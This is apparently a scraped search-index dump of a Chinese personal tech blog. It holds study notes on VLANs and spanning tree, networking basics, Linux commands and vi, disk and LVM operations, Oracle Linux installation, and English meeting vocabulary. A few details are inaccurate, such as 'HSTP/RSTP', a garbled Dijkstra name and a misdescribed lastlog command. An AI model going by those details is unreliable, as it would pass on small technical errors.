ID 区间为 0 到 4095，其中0和4095是保留的，VLAN 1是交换机默认存在的，并且所有接口默认是处于VLAN 1。一个初始化无任何配置的交换机，我们只需要把设备的接口接入交换机，那么这些设备默认都处于VLAN 1 一个 VLAN 就是一个广播域，所以处于一个 VLAN 的所有设备可以互相通信。 不同 VLAN 之间的设备无法互相通信，当一个二层设备接收到二层的以太网帧时，会对以太网帧进行拆分检查，如果查到这个 VLAN ID 不是自己需要转发的，就会将这个二层的以太网帧丢弃。这样VLAN就做到了对广播域的分割。\n端口模式 Tag，untag：untag 就是普通的 ethernet 报文，tag 报文被交换机加上了 4bytes 的vlan 信息（包含PVID）\nAccess\n只能属于1个VLAN，有自己的VLAN ID，且该端口不打tag，一般用于连接计算机端口；\nTrunk\n中继口，Trunk口用于传输二层的以太网帧，一个Trunk口可以传输多个VLAN。可以允许多个VLAN通过，且该端口打tag(PVID)，一般用于交换机之间的连接； 本征Vlan是针对Trunk中继链路而言，在trunk链路中默认是非Native vlan 带着Tag标签通过的。为了使传输以太网帧不带Tag标签而引入Native vlan的概念，其作用就是为兼容一些不支持Vlan的设备（比较早的设备或者一些无线AP) 或者不能打Tag标签的协议（如stp等等）。\n例如：trunk口允许10,20,30通过，带着10tag的帧可以通过，11tag的不行。而直连在trunk上的特殊设备，帧会被打上本征Vlan的tag。\nHybrid\nHybrid端口允许多个VLAN的报文发送时不打标签，而Trunk端口只允许本征VLAN的报文发送时不打标签。同一个交换机上不能 hybrid 和 trunk 并存。\n生成树协议 环路造成的问题：\n广播风暴：因为没有环路的抑制机制，每台交换机都会泛洪无尽的广播包。 多帧传输：帧的传输在到达目的站之前会无限的走下去，引起网络的堵塞 MAC地址表不稳定：由于交换机上不同端口上接收相同帧的多个副本，造成MAC表的抖动 生成树协议（Spanning Tree Protocol）：将局域网中所有可能产生环路的拓扑，通过所有相关设备的选举，抑制某些端口的数据转发，实现消除环路的功能。当任意一交换机中存在到达根网桥有两条或两条以上的链路时，STP会根据算法仅保留一条链路，切断其他链路，从而保证任意两个交换机之间只有一条单一的活动链路。这种生成的拓扑结构类似于以根交换机为树干的树形结构，因此被称为生成树协议。\n生成树是如何产生的？\n选择一个根网桥（Root Switch），在一个广播域中只有一个根网桥 根据最低路径成本来为每个非根网桥选择根端口（Root Port，RP），根端口显示到根网桥的最佳路径方向 根据最低路径成本选择每个网段的指定端口（DP），每个链路只有一个指定端口 根端口和指定端口转换到转发状态，其它端口变为阻塞状态 常见的生成树类型：\nSTP协议，最常见，也是最初的生成树协议，对于STP来说，所有VLAN属于一个生成树 MSTP协议，常用的生成树协议，对于MSTP来说，可以依据VLAN划分不同的生成树 HSTP/RSTP协议，STP协议的快速版本（生成树收敛的速度） 快速MSTP协议，顾名思义，MSTP的快速版本 ","date":"2024-05-13T14:25:51+08:00","permalink":"https://proben1.github.io/2024/%E4%BB%A5%E5%A4%AA%E7%BD%91%E5%9F%BA%E7%A1%80/","title":"以太网基础"},{"content":"网络 网络是一组相互连接的设备和终端系统，它们之间可以互相通信（传输数据）。\n协议 协议是计算机与计算机之间事先达成的一种“约定”，这种“约定”让不同厂商，不同CPU以及不同操作系统组成的计算机之间，只要遵循这种协议就可以进行通信。最初,每个厂商都有自己的网络体系结构和协议，且不相互兼容，所以导致一个问题，只有相同厂商的产品才可以相互通信，这样带来了极大的不便。 为了解决上述问题，ISO 制定了一个国际标准 OSI，对通信系统进行了标准化。\n网络层次划分 OSI中的层次 功能 TCP/IP协议族 应用层 文件传输，电子邮件，文件服务，虚拟终端，数据 Data TFTP，HTTP，SNMP，FTP，SMTP，DNS，Telnet 等等 表示层 数据格式化，代码转换，数据加密 null 会话层 建立或解除与其他节点的连接 null 传输层 提供端对端的接口，网段 Segment TCP，UDP 网络层 为数据包选择路由，数据包 Packet IP，ICMP，OSPF，EIGRP，IGMP 数据链路层 传输有地址的帧，错误检测，帧 Frame SLIP，CSLIP，PPP，MTU 物理层 以二进制数据形式在物理媒体上传输数据 ，位bit ISO2110，IEEE802，IEEE802.2 网络构成要素 数据链路 计算机之间通过电缆互相连接\n电缆可以分为很多种，包括：双绞线电缆、光纤电缆、同轴电缆、串行电缆等。根据数据链路的不同选用不同的电缆\n媒介可以划分为电波、微波等不同类型的电磁波\n传输速率又称带宽，单位 bps（Bits Per Second，每秒比特数）\n吞吐量指主机之间实际的传输速率\n网卡 任何一台计算机连接网络时，必须要使用网卡（网络接口卡 NIC），也被叫做网络适配器，网卡，LAN卡。 一块网卡包括了 OSI 模型的两个层，物理层和数据链路层，其主要作用为：\n将电脑的数据封装成帧，并通过网线（对于无线网来说就是电磁波）将数据发送到网络上去 接收网络上其它设备传过来的帧，并将帧重新组合成数据，发送到电脑中 中继器 中继器是在 OSI 模型的第一层（物理层）上 延长网络 的设备。由电缆传过来的电信号或光信号经由中继器的波形调整和放大再传给另一个电缆。\n有些中继器可以提供多个端口服务，这种中继器称作 中继集线器 或 集线器（Hub）\n网桥 / 2 层交换机 网桥是在 OSI 模型的第二层（数据链路层）上 连接两个网络 的设备，是一个扩大网络的器材。它能够识别数据链路层中的数据帧，并将这些数据帧临时存储于内存中，再生成信号作为一个全新的帧转发给相连的另一个网段（根据 MAC 地址）。\n现在 **交换集线器（Hub）**也属于网桥的一种，交换集线器中连接电缆的每个端口都能提供类似网桥的功能。\n路由器 / 3 层交换机 路由器是在 OSI 模型的第三层（网络层）上 连接两个网络、并对分组报文进行转发 的设备。网桥是根据**物理地址（MAC地址）**进行转发，而路由器则是根据 IP 地址进行处理的，在网络间起网关的作用，\n应用层设备 / 4、7层交换机 基于传输层数据包交换，是一类建立在TCP/IP应用层之上，实现用户应用需求的设备；它实现一类应用层的访问控制与质量保证服务，与其说它是硬件设备，不如说它是软件网络管理系统。实现负载均衡，包分析等等。\n负载均衡设备F5，Radware等\n安全设备 网络安全设备是保护计算机免受恶意攻击和未经授权的访问的重要工具。 如防火墙Firewall，WEB应用防护系统WAF，入侵防御系统IPS等等\nIP地址 1）网络地址\nIP地址由网络号（包括子网号）和主机号组成，网络地址的主机号为全0，网络地址代表着整个网络。\n2）广播地址\n广播地址通常称为直接广播地址，是为了区分受限广播地址。 广播地址与网络地址的主机号正好相反，广播地址中，主机号为全1。当向某个网络的广播地址发送消息时，该网络内的所有主机都能收到该广播消息。\n3）组播地址\nA类地址以0开头，第一个字节作为网络号，地址范围为：0.0.0.0~127.255.255.255； B类地址以10开头，前两个字节作为网络号，地址范围是：128.0.0.0~191.255.255.255; C类地址以110开头，前三个字节作为网络号，地址范围是：192.0.0.0~223.255.255.255。 D类地址以1110开头，地址范围是224.0.0.0~239.255.255.255，D类地址作为组播地址（一对多的通信）； E类地址以1111开头，地址范围是240.0.0.0~255.255.255.255，E类地址为保留地址，供以后使用。\n4）255.255.255.255\n该IP地址指的是受限的广播地址。受限广播地址与一般广播地址（直接广播地址）的区别在于，受限广播地址只能用于本地网络，路由器不会转发以受限广播地址为目的地址的分组；一般广播地址既可在本地广播，也可跨网段广播。例如：主机192.168.1.1/30上的直接广播数据包后，另外一个网段192.168.1.5/30也能收到该数据报；若发送受限广播数据报，则不能收到。 注：一般的广播地址（直接广播地址）能够通过某些路由器（当然不是所有的路由器），而受限的广播地址不能通过路由器。\n5）0.0.0.0\n常用于寻找自己的IP地址，例如在我们的RARP，BOOTP和DHCP协议中，若某个未知IP地址的无盘机想要知道自己的IP地址，它就以255.255.255.255为目的地址，向本地范围（具体而言是被各个路由器屏蔽的范围内）的服务器发送IP请求分组。\n6）回环地址\n127.0.0.0/8被用作回环地址，回环地址表示本机的地址，常用于对本机的测试，用的最多的是127.0.0.1。\nMac地址 **每一台网络设备都用物理地址来标识自己，**这个地址就是MAC地址。MAC地址也叫物理地址，大多数网卡厂商把MAC地址烧入了网卡的ROM中。网络设备的MAC地址是全球唯一的。\nMAC地址包含两部分： 1、前24比特是组织唯一标识符（OUI，Organizationally Unique Identifier），由IEEE统一分配给设备制造商。例如，华为的网络产品的MAC地址前24比特是0x00e0fc。 2、后24位序列号是厂商分配给每个产品的唯一数值，由各个厂商自行分配（这里所说的产品可以是网卡或者其他需要MAC地址的设备）。\nARP协议 ARP协议，即地址解析协议，是一个用于根据IP地址获取物理地址（通常是MAC地址）的TCP/IP协议。\n当一台主机需要向另一台主机发送数据时，它首先会检查本地ARP缓存中是否有目标主机的MAC地址。如果没有，它将发送一个ARP请求广播到网络上，询问目标IP地址对应的MAC地址是什么。目标主机在收到这个广播后，如果其IP地址与请求中的目标IP地址匹配，就会回复一个包含其MAC地址的ARP响应包。发送方在收到这个响应后，会将目标IP地址和MAC地址的对应关系存储在本地ARP缓存中，并使用这个MAC地址将数据包发送到目标主机。\nRAIP协议（Reverse Address Resolution Protocol）并不是一个标准的网络协议名称。在网络通信中，与ARP协议相对应的反向操作是将MAC地址转换为IP地址，通常是通过其他机制（如DHCP、DNS等）来实现的。\n路由选择协议 路由选择协议是一系列用于控制网络中流量转发的网络路由算法，这些算法以自动化、可靠的方式选择和整合复杂的网络路由信息，并将这些信息传递给路由处理器以实现数据传输。路由选择协议的目标是确定数据从源地址到目的地址传输的最佳路径。\n静态路由选择协议：路由选择规则是通过路由器配置文件事先确定的，而无需根据网络环境而随时调整。 动态路由选择协议：这些协议可以根据网络条件的变化自动调整路由选择。常见的动态路由协议包括RIP（路由信息协议）、OSPF（开放最短路径优先）和BGP（边界网关协议）等。 根据路由选择协议是运行在一个自治系统的内部还是运行在自治系统之间以连接不同的自治系统（AS），路由选择协议可以分为内部网关协议（IGP）和外部网关协议（EGP）。\n内部网关协议（IGP）：用于在自治系统内部交换路由选择信息的路由选择协议，如RIP和OSPF。 外部网关协议（EGP）：用于在自治系统之间交换路由选择信息的路由选择协议，如BGP。 RIP RIP是一种基于距离矢量（Distance-Vector）算法的协议，它使用跳数（Hop Count）作为度量值来衡量到达目的地址的距离。在RIP网络中,RIP协议要求网络中每一台路由器都要维护从自身到每一个目的网络的路由信息。RIP协议使用跳数来衡量网络间的“距离”：从一台路由器到其直连网络的跳数定义为1，从一台路由器到其非直连网络的距离定义为每经过一个路由器则距离加1。\nOSPF 由于RIP存在着收敛慢、路由环路、可扩展性差等问题，所以逐渐被OSPF取代。 OSPF基于迪杰特斯拉算法，每台路由器都通过链路状态数据库**LSDB(Link State DataBase)**掌握全网的拓扑结构。每台路由器都会收集其它路由器发来的LSA，所有的LSA放在一起便组成了链路状态数据库LSDB。 LSA是对路由器周围网络拓扑结构的描述，LSDB则是对整个自治系统的网络拓扑结构的描述。路由器将LSDB转换成一张带权的有向图，对整个网络拓扑结构的真实反映。\nBGP 是互联网上一个核心的去中心化自治路由协议。它通过维护IP路由表或“前缀”表来实现自治系统（AS）之间的可达性，属于矢量路由协议。现在的Internet是一个由多个自治系统相互连接构成的大网络，BGP作为事实上的Internet外部路由协议标准，被广泛应用于ISP（Internet Service Provider）之间。\n","date":"2024-05-13T11:05:54+08:00","permalink":"https://proben1.github.io/2024/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/","title":"网络基础"},{"content":" 类型 符号 作用 标准输出重定向 命令 \u0026gt; 文件 以覆盖的方式，把命令的正确输出输出到指定的文件或设备中 命令 \u0026raquo; 文件 以追加的方式，把命令的正确输出输出到指定的文件或设备中 标准错误输出重定向 错误命令 2\u0026gt; 文件 以覆盖的方式，把命令的错误输出输出到指定的文件或设备中 错误命令 2\u0026raquo; 文件 以追加的方式，把命令的错误输出输出到指定的文件或设备中 正确输出和错误输出同时保存 命令 \u0026gt; 文件 2\u0026gt;\u0026amp;1 以覆盖的方式，把正确输出和错误输出都保存到同一个文件当中 命令 \u0026raquo; 文件 2\u0026gt;\u0026amp;1 以追加的方式，把正确输出和错误输出都保存到同一个文件当中 命令 \u0026amp;\u0026gt;文件 以覆盖的方式，把正确输出和错误输出都保存到同一个文件当中 命令 \u0026amp;\u0026raquo;文件 以追加的方式，把正确输出和错误输出都保存到同一个文件当中 命令\u0026raquo;文件a 2\u0026raquo;文件b 把正确的输出追加到文件a中，把错误的输出追加到文件b中 crone\n* * * * * | | | | | | | | | +----- day of week (0 - 7) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat | | | +---------- month (1 - 12) OR jan,feb,mar,apr ... | | +--------------- day of month (1 - 31) | +-------------------- hour (0 - 23) +------------------------- minute (0 - 59) ","date":"2024-05-11T15:27:12+08:00","permalink":"https://proben1.github.io/2024/linux%E9%87%8D%E5%AE%9A%E5%90%91%E5%92%8Ccrone/","title":"Linux重定向和crone"},{"content":"启动步骤 一：上电与BIOS启动：\n上电：打开电源，BIOS（Basic Input/Output System）进行开机自检（POST）BIOS启动：初始化内存等设备，按照启动顺序，启动各个设备\n二：加载引导加载程序（Boot Loader）：\nBoot Loader读取配置文件grub.cfg、lilo.conf等，加载并启动Linux内核到内存，并跳转到内核的入口点开始执行。内核会进行一系列的初始化工作，如初始化硬件设备、建立内存空间的映射图等。\n三：执行init进程：\nLinux内核启动完成后，会启动第一个用户空间进程init（PID为1）。 init进程会读取/etc/inittab或/etc/systemd/system/default.target等配置文件，确定系统的运行级别（runlevel）。\n四：启动系统服务和管理器：\n根据运行级别，init进程会启动相应的服务和管理器（如systemd）。 systemd会根据配置文件（如/etc/systemd/system/和/lib/systemd/system/目录下的.service文件）启动相应的服务。\nUEFI和Legacy两种启动方式的区别 UEFI Legacy 更快的启动时间 相比UEFI，它的速度较慢 默认GPT 分区方案 默认MBR 分区方案 以 32 位和 64 位运行 16位 允许安全启动,将操作系统（OS）视为应用程序 它不提供允许加载未经授权的应用程序的安全启动方法，未限制双启动 UEK和RHCK内核 二者分别是Unbreakable Enterprise Kernel(UEK)以及Red Hat Compatible Kernel(RHCK) ，RHCK使用与Redhat一样的内核的版本，稳定性与兼容性有保证。 UEK的内核是基于更新的主流内核,同时附加了Oralce很多的加强功能。\nKernel和操作系统、硬件、驱动 内核操作系统的一个核心组成部分，主要用于管理计算机的硬件资源，如CPU、内存、输入输出等。 操作系统是建立在内核之上的一个软件系统，包括了Kernel、系统服务、工具程序和应用程序等，用户通过系统调用程序申请内核相关功能。 内核与计算机硬件交互，提供了操作系统运行的核心功能，如进程管理、内存管理、设备驱动程序等。 驱动又是内核与硬件沟通的桥梁，用于与特定硬件设备进行通信。\nKernel和shell Shell是用户与操作系统交互的主要接口，会将用户输入的命令通过系统调用（system call）发送给内核（Kernel）。 内核是操作系统的核心部分，负责管理系统资源、提供进程管理、内存管理、设备驱动等核心功能。 内核在接收到Shell发送的命令后，会执行相应的操作，并将结果返回给Shell。从而实现了用户的需求。\n用户连接、shell、变量和进程的关系 首先，系统会启动一个shell进程作为用户与操作系统之间的接口。\n其次，shell进程启动后，会加载并设置一系列的环境变量。系统级的环境变量和用户级环境变量。\n每当用户在shell中输入一个命令并回车时，shell会为该命令创建一个新的进程。这个新进程是shell进程的子进程，它继承了shell进程的环境变量。\nPCI连接设备 PCI（Peripheral Component Interconnect）是一种计算机总线标准，用于连接计算机主板和其他硬件设备。PCI连接设备指的是那些通过PCI总线与主板相连的设备。如显卡、声卡、网卡、RAID卡等。\n系统的运行级别 运行级别0：系统停机 运行级别1：单用户工作状态，root权限，用于系统维护，禁止远程登陆 运行级别2：多用户状态(没有NFS) 运行级别3：完全的多用户状态(有NFS)，登陆后进入控制台命令行模式 运行级别4：系统未使用，保留 运行级别5：图形GUI模式 运行级别6：系统正常关闭并重启\n存储在/etc/systemd/system/default.target 通过systemctl set-default xxx修改\n","date":"2024-05-11T15:27:07+08:00","permalink":"https://proben1.github.io/2024/linux%E6%A6%82%E5%BF%B5%E7%9F%A5%E8%AF%86-%E8%BF%90%E8%A1%8C%E5%86%85%E6%A0%B8%E5%92%8Cshell/","title":"Linux概念知识 运行、内核和shell"},{"content":"从UNICS到UNIX UNICS是“UNiplexed Information and Computing System”的简称，可以说是第一版UNIX，它由PDP-7机器的的汇编语言编写，因为PDP-7的性能不佳，开发者把第一版UNIX移植到PDP-11/20机器上，开发第二版，同时改名UNIX。1971年，汤普逊和里奇共同发明了C语言，重写了Unix，形成第三版UNIX。\nLinux与UNIX 接上文，Unix从实验室走出来并成为了操作系统的主流，Unix是商业软件。Linus Torvalds以学生时代熟悉的Unix作为原型，开发了类UNIX操作系统Linux，没有保留 Linux 源代码的版权，公开了代码，并邀请他人一起完善 Linux。\nGNU计划 GNU是“GNU is Not Unix”的缩写，目标是创建一套完全自由的操作系统，开发出包括C语言编译器GCC以及大部分UNIX系统的程序库和工具，在与Linux内核合并之后，产生了完全自由的操作系统。\nLinux发行版 目前市面上较知名的发行版有：Ubuntu、RedHat、CentOS、Debian、Fedora、SuSE、OpenSUSE、Arch Linux、SolusOS 等。\n","date":"2024-05-11T15:19:50+08:00","permalink":"https://proben1.github.io/2024/linux%E6%A6%82%E5%BF%B5%E7%9F%A5%E8%AF%86-%E8%83%8C%E6%99%AF%E4%B8%8E%E5%8F%91%E8%A1%8C%E7%89%88/","title":"Linux概念知识 背景与发行版"},{"content":"查看前五的占用CPU进程 ps -eo pid,ppid,%mem,%cpu,cmd --sort=-%cpu | head -n 6 ps -e显示所有进程，-o自定义输出格式，包括pid,ppid,%mem,%cpu,cmd（启动进程的命令名），通过cpu使用率降序排列。head -n 可以改数量。\n在指定目录下查找超过3天的所有文件 find 目录 -ctime +3 最近50个用户登录的记录 lastlog | head -n 51 22监听端口下所有进程的启动情况 netstat -tulnp | grep 22 查看环境变量，过滤掉所有以‘#’开头的注释行 grep -v \u0026#39;^#\u0026#39; /etc/profile 查询用户自动执行任务的配置情况 crontab -l -u 用户名 修改当前命令行显示 vi ~/.bashrc PS1=\u0026#34;\\u@\\h:[\\w]% \u0026#34; \\u：当前用户名（如oracle） \\h：主机名（如drocsdb1） [\\w]：当前工作目录（如/oracle） 空格：留个空方便读 统计有多少个和“mon”相关的进程 ps -ef | grep mon | wc -l\t#利用wc指令我们可以计算文件的Byte数、字数、或是列数 #-l或--lines 显示行数 awk \u0026lsquo;{print $2}\u0026rsquo; $2：表示第二个字段 print $2 ： 打印第二个字段 awk \u0026lsquo;{print $2}\u0026rsquo; $fileName : 一行一行的读取指定的文件， 以空格作为分隔符，打印第二个字段 比如有这样一个文件 a1 b1 c1 d1 a2 b2 c2 d2 执行的结果是,输出 b1 b2\n","date":"2024-05-11T15:13:26+08:00","permalink":"https://proben1.github.io/2024/linux%E5%A4%8D%E6%9D%82%E5%91%BD%E4%BB%A4/","title":"Linux复杂命令"},{"content":"磁盘常用命令 lsblk df（英文全拼：disk free） 命令用于显示目前在 Linux 系统上的文件系统磁盘使用情况统计。 -h, --human-readable：以人类可读的格式显示输出结果。 -i, --inodes：显示 inode 使用情况而不是块使用情况。 -T, --print-type：显示文件系统的类型。 du （英文全拼：disk usage） 命令用于显示目录或文件的大小。 -h或--human-readable -s或--summarize 仅显示指定目录或文件的总大小，而不显示其子目录的大小。 du -sh /ocs和 du -sh /ocs/* 分别查看目录使用空间和各个子目录使用空间 利用fdisk分区与挂载 fdisk /dev/nvme0n1 n/p/e/+1G mkfs.xfs /dev/nvme0n1p3(56) mount /dev/nvme0n1p3 /root/new vi /etc/fstab (add \u0026#34;/dev/nvme0n1p3 /root/new xfs defaults 0 0\u0026#34;) LVM基本创建 use \u0026#34;fisk\u0026#34; create new partition change the partition to \u0026#34;LVM\u0026#34;(8e) pvcreate /dev/nvme0n1p3 pvcreate /dev/nvme0n1p5 pvcreate /dev/nvme0n1p6 vgcreate vg01 /dev/nvme0n1p3 /dev/nvme0n1p5 /dev/nvme0n1p6 lvcreate -L 1g -n lvnew vg01 mkfs.xfs /dev/vg01/lvnew ... 条带化： 创建LV时加入-i参数\nLVM基本扩容 use \u0026#34;fisk\u0026#34; create new partition pvcreate /dev/nvme0n1p7 vgextend vg00 /dev/nvme0n1p7 lvextend /dev/vg00/lvoracle -L +9.9G vg00 xfs_growfs /dev/vg00/lvoracle SWAP扩容 swapoff 分区名/LV名（卸） 对SWAP所在的文件系统扩容 mkswap 分区名/LV名 swapon 分区名/LV名（挂） 案例 1、如何分析处理当前目录下有哪些大的文件？ 1，ls -al 确保没有隐藏文件 2，du -sh /test和 du -sh /test/* 分别查看目录使用空间和各个子目录使用空间。 3. lsof /test查看是否有某个进程使用的已删除的大文件，如果有kill掉进程 2、创建新文件时候，遇到如下报错可能的原因？ touch:cannot touch `test.txt‘: No space left on device\nblock不足，可以通过df -h看到使用率100%\tinode不足，可以通过df -i看到使用率 100%（小文件过多，索引不够） 这里提一下inode和block，在Linux系统中，文件由元数据和数据块组成。数据块就是多个连续性的扇区（sector），扇区是文件存储的最小单位（每个512字节）。块（block）的大小，最常见的是4KB，也就是连续8个sector组成，存储文件数据和目录数据。而元数据用来记录文件的创建者、创建日期、大小等，这种存储文件元数据信息的区域叫做inode，即索引节点。\n由于inode也是用来存储文件相关属性信息的，所以也会消耗硬盘空间。具体包含的信息有inode号，文件的字节数、User ID、Group ID、读、写、执行权限、时间戳（共有三个：ctime指inode上一次变动的时间，mtime指文件内容上一次变动的时间，atime指文件上一次打开的时间）、链接数（软硬链接）、数据block的位置，注意没有文件名。\n3、LVM扩容思路 lvs查看/test文件系统所在的lv使用的哪个vg vgs查看是否还有剩余空间\tpvs如果没有剩余空间，pvs查看是否还有未做PV的分区进行扩容 XFS和EXT4文件系统扩容\nlvextend –L 20G /dev/vg00/lvtest #xfs xfs_growfs /dev/vg00/lvtest #ext4 resize2fs /dev/vg00/lvtest 20G 4、条带化 把连续的数据分割成相同大小的数据块，把每段数据分别写入到阵列中的不同磁盘上，提升了存储性能。\nLVM中用“-i 磁盘数量”指令 lvcreate –L 1500G -i 3 –n lvtest vg00 利用parted分区与挂载 parted /dev/sdb1 mklabel gpt print mkpart primary 0% 100% quit # Let the kernel know to add a new partition partprobe mkfs.xfs /dev/sdb1 ","date":"2024-05-11T14:33:57+08:00","permalink":"https://proben1.github.io/2024/linux%E7%A3%81%E7%9B%98%E6%93%8D%E4%BD%9C/","title":"Linux磁盘操作"},{"content":"版本、内核查看 cat /etc/redhat-release cat /etc/os-release uname -a 关机、重启 shutdown -h now reboot 基本 ls -al 额外参数：-t时间排序 -r反序 -h大小 cat 文件 | less find 目录 -name 名字 cp -r 源 目的 mv -r 源 目的 touch 文件 file 文件 ln –s 实际文件 链接文件 du -sh /root/* （分开统计） du -sh /root （合并统计） iostat #查看当前系统的读写情况 查找 grep根据文件的内容进行查找 grep [options] pattern [files] -i：忽略大小写进行匹配。 -v：反向查找，只打印不匹配的行。 -n：显示匹配行的行号。 -r：递归查找子目录中的文件。 -l：只打印匹配的文件名。 -c：只打印匹配的行数。 find是根据文件的属性进行查找 find [路径] [匹配条件] [动作] -name pattern：按文件名查找，支持使用通配符 * 和 ?。 -type type：按文件类型查找，可以是 f（普通文件）、d（目录）、l（符号链接）等。 -size [+-]size[cwbkMG]：按文件大小查找，支持使用 + 或 - 表示大于或小于指定大小 -user username：按文件所有者查找。 -group groupname：按文件所属组查找。 -amin n：查找在 n 分钟内被访问过的文件。 -atime n：查找在 n*24 小时内被访问过的文件。 -cmin n：查找在 n 分钟内状态发生变化的文件（例如权限）。 -ctime n：查找在 n*24 小时内状态发生变化的文件（例如权限）。 -mmin n：查找在 n 分钟内被修改过的文件。 -mtime n：查找在 n*24 小时内被修改过的文件。 网络 hostname hostnamectl set-hostname \u0026lt;newhostname\u0026gt; ifconfig -a ip addr vi /etc/sysconfig/network-scripts TYPE=Ethernet（默认为以太网卡） BOOTPROTO=static（更改为静态配置方式） NAME=eth0（默认为网卡名） DEVICE=eth0（默认为网卡名） ONBOOT=yes（更改自动启动为yes） IPADDR=xx.xx.xx.xx（设置分配的IP地址） NETMASK=xx.xx.xx.xx（设置分配的掩码） GATEWAY=xx.xx.xx.xx（设置分配的网关） systemctl restart NetworkManager systemctl restart network 压缩打包 tar -c 创建文件 -x 提取 解压还原文件 -v 显示执行详细过程 -f 指定备份文件 -t 列出压缩包中包括哪些文件，不解包，查看包中的内容 -C 指定解压位置 tar -cvf grub.tar /boot/grub/ tar -xvf grub.tar.bz2 -C /opt/ 用户管理 groupadd –g GID groupname useradd –u 1601 –g GID(MAIN) –G GID(SUPPORT) –d /home/test –s /bin/bash –c “notes” username usermod -L username（锁） usermod -U username（解锁） usermod -g groupname username（改主组） usermod -aG groupname username（加副组） usermod -G othergroup username（重设副组） userdel -r username groupdel groupname id username passwd username su - username 切换用户，使用切换用户的变量 su username 切换用户，使用当前用户的变量 sudo Commands 以root身份来执行自己不具备权限的操作 权限管理 chmod 634 /tmp/test chown -R user:gruop /tmp/test 进程管理 jobs：查看当前正在后台工作的进程 fg：将后台进程放到前台执行 fg 1 bg：将后台进程在后台继续执行 bg 1 ctrl+z 同样也是放在后台执行 [ 指令与参数 ] \u0026amp; \u0026lt;==在终端机前景中工作 nohup [ 指令与参数 ] \u0026amp; \u0026lt;==在终端机背景中工作 ps aux或者ps –ef\t打印当前系统运行的所有进程 pstree 将当前时间点的进程树展示 kill -9 PID fuser -m /app 查看占用 fuser –kcu /app 快速删除占用的进程 服务管理 Systemctl命令使用方法 查询服务状态：systemctl status service名 启动服务：systemctl start service名 关闭服务：systemctl stop service名 重启服务：systemctl restart service名 使服务开机自启：systemctl enable service名 使服务开机不自启：systemctl disable service名 查看启动时候的报错相关信息或者日志信息： journalctl -xe\t带不带-xe都可，查看系统详细的日志 systemctl status xxxx 也可以看到少量的日志 vi 上左右下 hjkl [ Page Down ]和[ Page Up ]常用 [ Home ]和[ End ]常用 u 撤销上一次操作 ctrl + r 重做上一次撤销的操作 (n)x 删除字符 (n)dd 剪切 (n)yy 复制 p 粘贴 :w 保存文件。 :q 退出编辑器。 :wq 保存退出 /word 向光标之下寻找 ?word 向光标之上寻找 n 重复前一个搜寻的动作 这里提一下G和L的区别，G是直接文末，一般接?进行向上搜索；L是屏幕末尾，范围小于行末。\n","date":"2024-05-09T15:55:13+08:00","permalink":"https://proben1.github.io/2024/linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%92%8Cvi%E9%80%9F%E6%9F%A5/","title":"Linux常用命令和vi速查"},{"content":"Overview of Linux GNU/Linux (Linux kernel + GNU suite), UNIX-like OS. Compared with Windows, it has the advantages of stable system performance, speed and security. Commonly used in servers, embedded systems, network firewalls and so on. Because of its open source, powerful network functions, the system tool chain is complete and popular.\nimg\rCommon versions: RHEL, Oracle Linux, CentOS, Ubuntu, Debian, SUSE, archlinux and so on.\nDifference between UNIX and Linux UNIX is an operating system (non-open source) and linux is an open source operating system that has adopted the design concepts of the UNIX system in its many versions.\nBasic idea Everything is a document.\nEvery document has a defined purpose.\nLinux installation and basic configuration System Oracle Linux 8.6 installation and configuration via VMware WORKSTATION PRO 17.\nimg\rBasic Configuration After loading by VM, in the installation interface, select the language as English (United States), Language Support select EN (US) and Simplified Chinese in turn, and select the time zone at the same time.\nEnter the installation source, wait for loading and detection, select the local CD-ROM drive ISO file as the installation source, and select Minimized Installation in Software Selection.\nSystem partitioning: customized manual partitioning Boot partition：/boot, 1G, file system type is xfs, Device Type is Standard\nRoot partition：/20G, adjust LVM settings, VG Name,vg00;RAID Level,None;Size policy,As large as possible;and change the name to lvroot.\nPartition in order (using LVM management, XFS file system format, belongs to VG00)\n/usr，10G，lvusr\n/var，50G，lvvar\n/tmp，1G，lvtmp\nswap，1G，lvswap\n/opt，10G，lvopt\n/home，1G，lvhome\n/var/tmp，5G，lvvar_tmp\n/var/log，10G，lvvar_log\n/var/log/audit，1G，lvvar_log_audit\n/soft，1G，lvsoft\nimg\rOthers KDUMP: check Enable kdump, select the policy as Automatic\nSecurity policy: keep the default value\nPassword: set a strong password, at least 8 digits, including upper case letters, lower case letters, numbers and special symbols.\nFinish the loading configuration, perform a reboot, and choose to boot from Oracle Linux Server 8 UEK kernel by default when rebooting.\nEntered the system.\nimg\rNetwork Configuration Go to the directory where the network cards are configured: cd /etc/sysconfig/network-scripts\nView all network cards: ifconfig -a\nConfigure eth0 (lo for loopback) for remote connection to the system.\nvi /etc/sysconfig/network-scripts/ifcfg-eth0\nCheck the Version and Kernel version:\ncat /etc/redhat-release\nimg\rcat /etc/os-release\nimg\rkernel:\nuname -a\nimg\r","date":"2024-05-09T15:44:05+08:00","permalink":"https://proben1.github.io/2024/oracle-linux-installation/","title":"Oracle Linux Installation"},{"content":"Meeting-会议：这个Meeting是最常见的用词，可以说是个万金油，任何人都可以说我有一个meeting要开，要参加等等。Meeting的规模可大可小，层次可高可低，可以是正式或非正式的聚会，如特别会议、联席会议、首脑会议、紧急会议；从1对1的2人会议到1对多，多多对的千人会议都有。在MICE行业的第一个词M就是meeting，通常是以规模并不是特别的大公司会议为主。\nConference-大会：较正式用词，使用范围甚广，多数国际会议用此词，如万隆会议、雅尔塔会议、美洲国家会议。这个词来自于拉丁语，意思是confer的行为，而confer的意思是给与、谈论、比较，引申为推理、商谈等。所以这种会议应该是比较正式的讨论会议。\nCongress-大会：代表大会，由正式代表出席的会议，一般规模较大，大到数万人均有，通常是由协会、学会等社团、政党、NGO组织举办的代表大会，如国际地球物理学家代表大会、党代会、人代会等。Congress既然是政党和社团的会议，比较正式、严肃、程序规范，有固定的格式和内容，包括全体大会、分会、改选、公示、大会决议、公报等等。据说，这个词源自15世纪的“与会者的人员”，且这些人员一般是武装人员来开会，后来演变为代表会议乃至议会，所以其政治性高、规模大，学术会议用的少。\nConvention-大会：这个与congress很相似，也是大型的社团会议居多，因此ICCA（国际大会与会议协会）的两个C就是congress和convention。Convention与congress的区别是convention不仅规模大，会议期间还带有一些展览。因此，往往以会议起家，发展为会＋展的大会称为Convention。在美国，大多数的会展中心名字叫做convention 